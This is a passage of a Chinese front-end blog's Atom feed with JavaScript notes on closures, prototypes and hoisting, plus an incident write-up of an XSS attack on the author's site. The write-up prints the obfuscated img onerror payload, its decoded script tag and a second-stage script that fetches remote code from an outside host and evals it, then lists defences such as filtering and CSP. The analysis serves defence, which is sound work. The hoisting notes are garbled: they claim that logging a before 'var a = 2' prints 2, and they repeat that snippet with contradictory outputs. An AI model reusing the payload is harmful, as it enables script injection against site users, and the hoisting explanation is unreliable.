它的行为是分别打印数字“1”，“2”，……“5”，一次一个，一秒一个<br>实际上，如果你运行这段代码，你会得到“6”被打印5次，一秒一个。</p><p class="tip">我们试图 暗示 在迭代期间，循环的每次迭代都“捕捉”一份对 i 的拷贝。但是，虽然所有这5个函数在每次循环迭代中分离地定义，由于作用域的工作方式，它们 都闭包在同一个共享的全局作用域上，而它事实上只有一个 i</p><p>如何解决这个问题呢，定义一个新的作用域，在每次迭代时持有值 i 的一个拷贝。在新的匿名函数内部定义了一个新的局部作用域，i设置为了每次遍历时的值，这样便不会继续往上遍历了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">1</span>; i&lt;=<span class="number">5</span>; i++) &#123;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">j</span>)</span>&#123;</span><br><span class="line">setTimeout( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( j );</span><br><span class="line">&#125;, j*<span class="number">1000</span> );</span><br><span class="line">&#125;)( i );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;作用域&quot;&gt;&lt;a href=&quot;#作用域&quot; class=&quot;headerlink&quot; title=&quot;作用域&quot;&gt;&lt;/a&gt;作用域&lt;/h2&gt;&lt;p&gt;在进入作用域的讨论之前先明什么是作用域，通过一句话简单描述就是：&lt;strong&gt;一组明确定义的规则，它定义如何在某些位置存储变量，以
      
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript系列之原型与原型链</title>
    <link href="http://zhoushaw.github.io/2019/04/20/learning/font-end/js/JavaScript-prototype/"/>
    <id>http://zhoushaw.github.io/2019/04/20/learning/font-end/js/JavaScript-prototype/</id>
    <published>2019-04-20T02:47:35.000Z</published>
    <updated>2019-04-27T13:21:01.129Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在JavaScript语言中实际上并不存在“类”，那么它是如何实现<strong>继承</strong>、<strong>多态</strong>、<strong>实例化</strong>等特性呢。它采用了与类不同的另一种技术，将其称之为<strong>原型</strong>，并通过<strong>原型链</strong>来实现<strong>继承</strong>、<strong>多态</strong>等特性。</p><p>但是需要注意的是JavaScript的<strong>继承</strong>,与Java的继承实际上有很大的区别，在Java语言中，<strong>继承</strong>是一个<strong>拷贝过程</strong>在物理地址上发生了拷贝，而JavaScript语言是通过<strong>原型链</strong>将其”链接”在一起，没有发生实际的拷贝。</p><div><a id="more"></a></div><h2 id="构造函数创建对象"><a href="#构造函数创建对象" class="headerlink" title="构造函数创建对象"></a>构造函数创建对象</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function Person() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">var person = new Person();</span><br><span class="line">person.name = &apos;Kevin&apos;;</span><br><span class="line">console.log(person.name) // Kevin</span><br></pre></td></tr></table></figure><p>在这个例子中，Person 就是一个构造函数，我们使用 new 创建了一个实例对象 person。</p><h2 id="原型"><a href="#原型" class="headerlink" title="原型"></a>原型</h2><h3 id="prototype"><a href="#prototype" class="headerlink" title="prototype"></a>prototype</h3><p>什么是原型呢？可以这样理解：每一个JavaScript对象(null除外)在创建的时候就会与之<strong>关联</strong>另一个对象，这个对象就是我们所说的<strong>原型</strong>，每一个对象都会从<strong>原型</strong>“<strong>继承</strong>“属性。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function Person() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">// 虽然写在注释里，但是你要注意：</span><br><span class="line">// prototype是函数才会有的属性</span><br><span class="line">Person.prototype.name = &apos;Kevin&apos;;</span><br><span class="line">var person1 = new Person();</span><br><span class="line">var person2 = new Person();</span><br><span class="line">console.log(person1.name) // Kevin</span><br><span class="line">console.log(person2.name) // Kevin</span><br></pre></td></tr></table></figure><p>这个函数的 prototype 属性到底指向的是什么呢？是这个函数的原型吗？</p><blockquote><p>上面例子中的解释：</p></blockquote><ul><li><code>Person</code>为构造函数</li><li><code>person1</code>、<code>person2</code>为<code>Person</code>的实例</li><li>构造函数的<code>prototype</code>属性指向，调用该构造函数而创建的实例的<strong>原型</strong></li><li><code>Person.prototype</code>为<code>person1</code>的<strong>原型</strong></li><li><code>person1</code>、<code>person2</code>继承了原型中的<code>name</code>属性</li></ul><p>用一张图解释<strong>构造函数</strong>与<strong>实例原型</strong>的关系</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190421_21bijk293k7244lgcie0j4fgbe5g2_1058x578.png" alt=""></p><h3 id="proto"><a href="#proto" class="headerlink" title="proto"></a><strong>proto</strong></h3><p>在上面的<strong>prototype</strong>中我们详细描述了<strong>构造函数</strong>如何与实例原型联系起来，那<strong>实例</strong>如何与<strong>实例原型</strong>之间如何联系呢？</p><p>在标准浏览器中构造函数的<strong>实例</strong>都拥有一个<code>__proto__</code>属性，通过这个<strong>实例</strong>上的<strong>属性</strong>可以找到这个实例的原型</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190421_1235011ggh2af3b01hj7941010l4l_990x668.png" alt=""></p><h3 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h3><p>每个原型都有一个 <strong>constructor</strong> 属性指向关联的构造函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function Person() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">console.log(Person === Person.prototype.constructor); // true</span><br></pre></td></tr></table></figure><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190421_1345h0c13a027556c48j45lj2ib2e_1104x556.png" alt=""></p><p>综上我们已经得出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function Person() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var person = new Person();</span><br><span class="line"></span><br><span class="line">console.log(person.__proto__ == Person.prototype) // true</span><br><span class="line">console.log(Person.prototype.constructor == Person) // true</span><br><span class="line">// 顺便学习一个ES5的方法,可以获得对象的原型</span><br><span class="line">console.log(Object.getPrototypeOf(person) === Person.prototype) // true</span><br></pre></td></tr></table></figure><p>并且我们得出了：<code>构造函数</code>、<code>原型</code>、<code>实例</code>之间的关系</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190421_7b4h6c755ckcg3ig1719c71jjdlcc_1244x990.png" alt=""></p><h2 id="实例与原型"><a href="#实例与原型" class="headerlink" title="实例与原型"></a>实例与原型</h2><p>当我们读取<strong>对象</strong>属性时，若我们读取的对象不存在，将会自动到对象的<strong>原型</strong>上查找属性是否存在，如果属性不存在将会到<strong>原型的原型</strong>上查找，一直会找到null为止</p><p>通过🌰我们来进行说明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function Person() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person.prototype.name = &apos;Kevin&apos;;</span><br><span class="line"></span><br><span class="line">var person = new Person();</span><br><span class="line"></span><br><span class="line">person.name = &apos;Daisy&apos;;</span><br><span class="line">console.log(person.name) // Daisy</span><br><span class="line"></span><br><span class="line">delete person.name;</span><br><span class="line">console.log(person.name) // Kevin</span><br></pre></td></tr></table></figure><p>第一次log输出时我们得到了预期输出<code>Daisy</code>,随后我们通过<code>delete</code>关键词删除了person实例上的<code>name</code>属性，第二次输出是通过查询发现person实例中并不存在属性<code>name</code>，到<code>person</code>实例的原型<code>Person.prototype</code>上进行查找找到<code>name</code>属性，查询终止。</p><p>若<code>Person.prototype</code>上任然不存在<code>name</code>属性呢，将会从何处进行查询?</p><h2 id="原型的原型"><a href="#原型的原型" class="headerlink" title="原型的原型"></a>原型的原型</h2><p>从<code>实例</code>与<code>实例原型</code>的关系里面可以知道，通过<code>__proto__</code>属性我们可以查询到期原型，那么原型的原型是什么呢?</p><p>通过这个🌰我们可以很清晰的知道，构造函数的原型的原型是<code>Object.prototype</code>,<code>Object.prototype</code>的原型是<code>null</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function Person()&#123;&#125;</span><br><span class="line">Person.prototype.__proto__ === Object.prototype // true</span><br><span class="line">Object.prototype.__proto__ === null // true</span><br></pre></td></tr></table></figure><p>通过上述的知识点我们可以构建成一幅完整的关系：</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190421_7cebll7hhc7ea3jfe102f2g4fj4fa_836x772.png" alt=""></p><p>其中<strong>青色</strong><code>__proto__</code>的线路就是我们通常所说的原型链</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://github.com/getify/You-Dont-Know-JS/blob/1ed-zh-CN/this%20%26%20object%20prototypes/ch5.md" target="_blank" rel="noopener">you don’t know js: this &amp; prototype</a></li><li><a href="https://github.com/mqyqingfeng/Blog/issues/2" target="_blank" rel="noopener">JavaScript深入之从原型到原型链</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在JavaScript语言中实际上并不存在“类”，那么它是如何实现&lt;strong&gt;继承&lt;/strong&gt;、&lt;strong&gt;多态&lt;/strong&gt;、&lt;strong&gt;实例化&lt;/strong&gt;等特性呢。它采用了与类不同的另一种技术，将其称之为&lt;strong&gt;原型&lt;/strong&gt;，并通过&lt;strong&gt;原型链&lt;/strong&gt;来实现&lt;strong&gt;继承&lt;/strong&gt;、&lt;strong&gt;多态&lt;/strong&gt;等特性。&lt;/p&gt;
&lt;p&gt;但是需要注意的是JavaScript的&lt;strong&gt;继承&lt;/strong&gt;,与Java的继承实际上有很大的区别，在Java语言中，&lt;strong&gt;继承&lt;/strong&gt;是一个&lt;strong&gt;拷贝过程&lt;/strong&gt;在物理地址上发生了拷贝，而JavaScript语言是通过&lt;strong&gt;原型链&lt;/strong&gt;将其”链接”在一起，没有发生实际的拷贝。&lt;/p&gt;
&lt;div&gt;
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>前端安全与防范</title>
    <link href="http://zhoushaw.github.io/2019/04/16/learning/font-end/security/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E4%B8%8E%E9%98%B2%E8%8C%83/"/>
    <id>http://zhoushaw.github.io/2019/04/16/learning/font-end/security/前端安全与防范/</id>
    <published>2019-04-16T01:36:35.000Z</published>
    <updated>2019-04-20T12:39:57.663Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天主站遭受了xss攻击，起因是一个普通用户发表了一个穿搭，后端接收到异常警报排查后发现用户的穿搭的<strong>描述</strong>中带有:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;body/hidden&gt;&lt;img src=x onerror=document[&apos;write&apos;](atob(&apos;PGJvZHkvaGlkZGVuPjxzY3JpcHQgc3JjPWh0dHBzOi8vczUubW9ndWNkbi5jb20vbWxjZG4vYzQ1NDA2LzE5MDQxNV82M2o2NWxlazRkMjJnODZjNWhiN2thOThsOWZmZT48L3NjcmlwdD4=&apos;))&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>因为穿搭look中带有格式化后html的描述内容，所以直接通过<strong>v-html</strong>指令输出了描述内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div v-if=&quot;from === &apos;detail&apos;&quot; v-html=&quot;content&quot; ref=&quot;content&quot; style=&quot;-webkit-user-select: text&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>这个时候攻击的html标签将会直接被注入到页面中，这里还涉及到另外一个知识点：</p><ul><li>btoa（base64加密）</li><li>atob （base64解密）</li></ul><div><a id="more"></a></div><p>经过<code>atob</code>解密后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">atob(&apos;PGJvZHkvaGlkZGVuPjxzY3JpcHQgc3JjPWh0dHBzOi8vczUubW9ndWNkbi5jb20vbWxjZG4vYzQ1NDA2LzE5MDQxNV82M2o2NWxlazRkMjJnODZjNWhiN2thOThsOWZmZT48L3NjcmlwdD4=&apos;)</span><br><span class="line"></span><br><span class="line">// 转变成</span><br><span class="line"></span><br><span class="line">&lt;body/hidden&gt;&lt;script src=https://s5.mogucdn.com/mlcdn/c45406/190415_63j65lek4d22g86c5hb7ka98l9ffe&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">// 一般攻击者都不会将，body隐藏。而是直接通过盗用信息</span><br></pre></td></tr></table></figure><p>通过<code>document[&#39;write&#39;]</code>将dom写入页面后，通过<code>mogucdn</code>资源将会下载脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var ua = navigator.userAgent.toLowerCase();</span><br><span class="line"></span><br><span class="line">// 在微信环境下，将会通过ajax请求获取站外脚本，获取完成后通过eval动态执行</span><br><span class="line">if (/micromessenger/.test(ua)) &#123;</span><br><span class="line">    $.get(&apos;https://api.ruanwin.com/j&apos;,function(d) &#123;</span><br><span class="line">        window[&apos;ev&apos; + &apos;al&apos;](d);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>所幸精选穿搭必须由产品手动审核，该look并不会进入首页，否则至少将造成P1级故障</strong></p><h2 id="安全于防范"><a href="#安全于防范" class="headerlink" title="安全于防范"></a>安全于防范</h2><blockquote><p>常见攻击手段</p></blockquote><ul><li><p>XSS</p><ul><li>跨站脚本（Cross-site scripting，通常简称为XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。</li></ul></li><li><p>CSRF</p><ul><li>跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。</li></ul></li></ul><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><blockquote><p>XSS防范</p></blockquote><p>在前言中的案例，就是<code>XSS</code>攻击的典范。我们如何避免被<code>XSS</code>攻击呢，可以从以下几方面入手：</p><ul><li>输入过滤<ul><li><blockquote><p>符号转译成<code>&amp;lt;</code>等符号</p></blockquote></li></ul></li><li>内容输出<ul><li>含有<code>html</code>输出内容，对 HTML 做安全过滤。下文将详细介绍如果进行安全过滤设计</li><li>禁止使用：<code>.innerHTML</code>、<code>.outerHTML</code>、<code>document.write()</code></li><li><strong>Vue</strong>/<strong>React</strong> 技术栈，并且不使用 <code>v-html</code>/<code>dangerouslySetInnerHTML</code></li><li>过滤库<a href="https://github.com/leizongmin/js-xss" target="_blank" rel="noopener">js-xss</a></li></ul></li><li>使用CSP，限制非白名单脚本加载<ul><li>http请求头添加：Content-Security-Policy</li><li>参考：<a href="http://www.ruanyifeng.com/blog/2016/09/csp.html" target="_blank" rel="noopener">csp防范添加</a></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;今天主站遭受了xss攻击，起因是一个普通用户发表了一个穿搭，后端接收到异常警报排查后发现用户的穿搭的&lt;strong&gt;描述&lt;/strong&gt;中带有:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;p&amp;gt;&amp;lt;body/hidden&amp;gt;&amp;lt;img src=x onerror=document[&amp;apos;write&amp;apos;](atob(&amp;apos;PGJvZHkvaGlkZGVuPjxzY3JpcHQgc3JjPWh0dHBzOi8vczUubW9ndWNkbi5jb20vbWxjZG4vYzQ1NDA2LzE5MDQxNV82M2o2NWxlazRkMjJnODZjNWhiN2thOThsOWZmZT48L3NjcmlwdD4=&amp;apos;))&amp;gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因为穿搭look中带有格式化后html的描述内容，所以直接通过&lt;strong&gt;v-html&lt;/strong&gt;指令输出了描述内容：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;div v-if=&amp;quot;from === &amp;apos;detail&amp;apos;&amp;quot; v-html=&amp;quot;content&amp;quot; ref=&amp;quot;content&amp;quot; style=&amp;quot;-webkit-user-select: text&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这个时候攻击的html标签将会直接被注入到页面中，这里还涉及到另外一个知识点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;btoa（base64加密）&lt;/li&gt;
&lt;li&gt;atob （base64解密）&lt;/li&gt;
&lt;/ul&gt;
&lt;div&gt;
    
    </summary>
    
      <category term="security" scheme="http://zhoushaw.github.io/categories/security/"/>
    
    
      <category term="security" scheme="http://zhoushaw.github.io/tags/security/"/>
    
  </entry>
  
  <entry>
    <title>scope &amp; closures</title>
    <link href="http://zhoushaw.github.io/2019/04/05/learning/book-notes/scope&amp;closures/"/>
    <id>http://zhoushaw.github.io/2019/04/05/learning/book-notes/scope&amp;closures/</id>
    <published>2019-04-04T20:36:35.000Z</published>
    <updated>2019-04-20T12:39:57.661Z</updated>
    
    <content type="html"><![CDATA[<h2 id="参考来源"><a href="#参考来源" class="headerlink" title="参考来源"></a>参考来源</h2><p>本文是you don’t know js系列的 <a href="https://github.com/getify/You-Dont-Know-JS/tree/1ed-zh-CN/scope%20%26%20closures" target="_blank" rel="noopener">作用域与闭包</a> 笔记</p><h2 id="一、作用域"><a href="#一、作用域" class="headerlink" title="一、作用域"></a>一、作用域</h2><h3 id="什么是作用域"><a href="#什么是作用域" class="headerlink" title="什么是作用域"></a>什么是作用域</h3><p>几乎所有计算机语言都提供了最基础的变量模型，变量它允许人们将值存入变量中，并且再后续从变量中取值或修改值。</p><p>但是变量的存储同样会带来几个问题，我们如何存储数据到变量上，又如何查找变量的值。这样的一些列规则我们将其称之为作用域</p><p><div><a id="more"></a></div></p><h3 id="理解作用域"><a href="#理解作用域" class="headerlink" title="理解作用域"></a>理解作用域</h3><p>如何正确的理解作用域呢，为了方便理解可以简单的将JavaScript程序运行时分成三大部分：</p><ul><li>引擎：负责从始至终的编译和执行我们的 JavaScript 程序。</li><li>编译器：引擎 的朋友之一；处理所有的解析和代码生成的重活儿</li><li>作用域：引擎 的另一个朋友；收集并维护一张所有被声明的标识符（变量）的列表，并对当前执行中的代码如何访问这些变量强制实施一组严格的规则。</li></ul><p>让我们来分析引擎是如何处理<code>var a = 2;</code>这样的一个语句的吧，首先一个合理的假设是：为一个变量分配一个内存，并将其标记成a。然后将2赋值到变量a中。不幸的是，这并不是十分精准的</p><p>编译器会这样处理：</p><ul><li>编译器首先会进行词法分析，将<code>var a = 2;</code>字符串打断成有意义的片段也称之为token，这段程序有可能会被打断成<code>var</code>、<code>a</code>、<code>=</code>、<code>2</code>和<code>=</code></li><li>将一个 token 的流（数组）转换为一个嵌套元素的树，它综合地表示了程序的语法结构。</li><li>词法分析和AST(抽象语法树)转换完成后，遇到<code>var a</code>，编译器会让作用域查看是否存在当前这个特定的作用域集合，变量 <code>a</code> 是否已经存在了。如果是，编译器 就忽略这个声明并继续前进。否则，编译器 就让 作用域 去为这个作用域集合声明一个称为 a 的新变量。</li><li>然后 编译器 为 引擎 生成稍后要执行的代码，来处理赋值 a = 2。引擎 运行的代码首先让 作用域 去查看在当前的作用域集合中是否有一个称为 a 的变量可以访问。如果有，引擎 就使用这个变量。如果没有，引擎 就查看 其他地方</li></ul><blockquote><p>编译器术语</p></blockquote><p>在我们这个例子中，引擎 将会对变量 <code>a</code> 实施一个“LHS”查询。另一种类型的查询称为“RHS”。</p><p>换言之，当一个变量出现在赋值操作的左手边时，会进行 LHS 查询，当一个变量出现在赋值操作的右手边时，会进行 RHS 查询。<br>可以认为LHS 查询是试着找到变量容器本身，以便它可以赋值,“RHS”意味着“取得他/她的源（值）”，暗示着 RHS 的意思是“去取……的值<br>在概念上将它考虑为：“赋值的目标（LHS）”和“赋值的源（RHS）”</p><h3 id="嵌套的作用域"><a href="#嵌套的作用域" class="headerlink" title="嵌套的作用域"></a>嵌套的作用域</h3><p>我们说过 作用域 是通过标识符名称查询变量的一组规则。但是，通常会有多于一个的 作用域 需要考虑。</p><p>就像一个代码块儿或函数被嵌套在另一个代码块儿或函数中一样，作用域被嵌套在其他的作用域中。所以，如果在直接作用域中找不到一个变量的话，引擎 就会咨询下一个外层作用域，如此继续直到找到这个变量或者到达最外层作用域（也就是全局作用域）。</p><h3 id="变量提升"><a href="#变量提升" class="headerlink" title="变量提升"></a>变量提升</h3><p>有一种倾向认为你在 JavaScript 程序中看到的所有代码，在程序执行的过程中都是从上到下一行一行地被解释执行的。虽然这大致上是对的，但是这种猜测中的一个部分可能会导致你错误地考虑你的程序。</p><p class="tip">在作用域的规则中，存在“变量提升”这么一个概念。不过，需要注意的是，这个概念可能产生一点点误解 。例如，从概念的字面意义上说，“变量提升”意味着变量和函数的声明会在物理层面移动到代码的最前面，但这么说并不准确。实际上变量和函数声明在代码里的位置是不会动的，而是在编译阶段被放入内存中。</p><blockquote><p>考虑另一个代码段：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log( a );</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>许多开发者会期望 undefined，因为语句 var a 出现在 a = 2 之后，这很自然地看起来像是这个变量被重定义了，并因此被赋予了默认的 undefined。然而，输出将是 2。</p><blockquote><p>考虑另一个代码段：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log( a );</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>你可能会被诱导而这样认为：因为上一个代码段展示了一种看起来不是从上到下的行为，也许在这个代码段中，也会打印 2。另一些人认为，因为变量 a 在它被声明之前就被使用了，所以这一定会导致一个 ReferenceError 被抛出。</p><p>不幸的是，两种猜测都不正确。输出是 undefined。</p><h4 id="编译器再次袭来"><a href="#编译器再次袭来" class="headerlink" title="编译器再次袭来"></a>编译器再次袭来</h4><p>引擎 实际上将会在它解释执行你的 JavaScript 代码之前编译它。编译过程的一部分就是找到所有的声明，并将它们关联在合适的作用域上。</p><p>所以，考虑这件事情的最佳方式是，在你的代码的任何部分被执行之前，所有的声明，变量和函数，都会首先被处理。</p><p class="tip">当你看到 var a = 2; 时，你可能认为这是一个语句。但是 JavaScript 实际上认为这是两个语句：var a; 和 a = 2;。第一个语句，声明，是在编译阶段被处理的。第二个语句，赋值，为了执行阶段而留在 原处。</p><p>于是我们的第一个代码段应当被认为是这样被处理的：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">console</span>.log( a );</span><br></pre></td></tr></table></figure><p>相似地，我们的第二个代码段实际上被处理为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log( a );</span><br><span class="line"></span><br><span class="line">a = <span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>所以，关于这种处理的一个有些隐喻的考虑方式是，变量和函数声明被从它们在代码流中出现的位置“移动”到代码的顶端。这就产生了“提升”这个名字。</p><h4 id="函数申明提升"><a href="#函数申明提升" class="headerlink" title="函数申明提升"></a>函数申明提升</h4><p class="tip">当你看到 var a = 2; 时，你可能认为这是一个语句。但是 JavaScript 实际上认为这是两个语句：var a; 和 a = 2;。第一个语句，声明，是在编译阶段被处理的。第二个语句，赋值，为了执行阶段而留在 原处。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">foo();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( a ); <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数 foo 的声明（在这个例子中它还 包含 一个隐含的、实际为函数的值）被提升了，因此第一行的调用是可以执行的。</p><p class="tip">还需要注意的是，提升是 以作用域为单位的。所以虽然我们的前一个代码段被简化为仅含有全局作用域，但是我们现在检视的函数foo(..)本身展示了，var a被提升至foo(..)的顶端（很明显，不是程序的顶端）。所以这个程序也许可以更准确地解释为：</p><p>函数声明会被提升，就像我们看到的。但是函数表达式不会。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> a;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log( a ); <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 与</span></span><br><span class="line">foo(); <span class="comment">// 不是 ReferenceError， 而是 